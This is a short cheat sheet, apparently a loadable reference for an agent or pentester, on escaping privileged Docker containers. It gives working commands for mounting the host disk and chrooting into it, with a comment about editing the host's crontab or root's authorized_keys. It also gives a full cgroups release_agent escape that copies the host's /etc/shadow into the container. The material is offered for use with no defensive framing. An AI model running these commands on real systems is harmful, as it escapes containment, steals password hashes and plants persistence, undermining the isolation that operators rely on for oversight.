# Privileged Container Escapes

**Load when**: Command `capsh --print` shows `CAP_SYS_ADMIN` or the container was launched with `--privileged`.

## 1. The Mount Host Drive Escape
If the container sees host blocks (check `fdisk -l` or `ls /dev/sd*`), simply mount the host root partition.
```bash
mkdir /mnt/host
mount /dev/sda1 /mnt/host
# Modify host's /etc/crontab or /root/.ssh/authorized_keys
chroot /mnt/host
```

## 2. The cgroups release_agent Escape
If `CAP_SYS_ADMIN` is present but the host drives aren't exposed, abuse the cgroups v1 release_agent feature.

```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# Get the host path of the current container
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo 1 > /tmp/cgrp/x/notify_on_release
# Point release_agent to a payload on the host side
echo "$host_path/cmd" > /tmp/cgrp/release_agent
# Create the payload
echo '#!/bin/sh' > /cmd
echo 'cat /etc/shadow > '"$host_path"'/output' >> /cmd
chmod +x /cmd
# Trigger
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
Wait a moment, then read `/output` for the host's `/etc/shadow`.
